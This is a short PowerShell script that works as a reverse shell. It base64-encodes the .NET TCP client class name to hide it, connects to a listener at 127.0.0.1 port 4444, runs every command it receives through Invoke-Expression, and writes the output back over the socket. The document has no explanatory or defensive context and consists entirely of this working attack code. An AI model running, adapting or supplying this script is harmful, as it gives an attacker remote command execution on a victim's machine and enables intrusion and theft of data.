$a="TmV0LlNvY2tldHMuVENQQ2xpZW50"; 
$b=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))
$c=New-Object ($b) ("127.0.0.1",4444)
$s=$c.GetStream()
$z=New-Object byte[] 1024

while($true) {
    $i = $s.Read($z, 0, $z.Length)
    if ($i -le 0) { break }

    $y = [System.Text.Encoding]::ASCII.GetString($z, 0, $i).Trim()
    if ($y -ne '') {
        try {
            # Execute the command and capture the output
            $o = (Invoke-Expression -Command $y 2>&1 | Out-String)
            $r = [System.Text.Encoding]::ASCII.GetBytes($o)
        } catch {
            $r = [System.Text.Encoding]::ASCII.GetBytes("Error: $($_.Exception.Message)`n")
        }
        # Send the output back to the listener
        $s.Write($r, 0, $r.Length)
    }
}

$s.Close()
$c.Close()
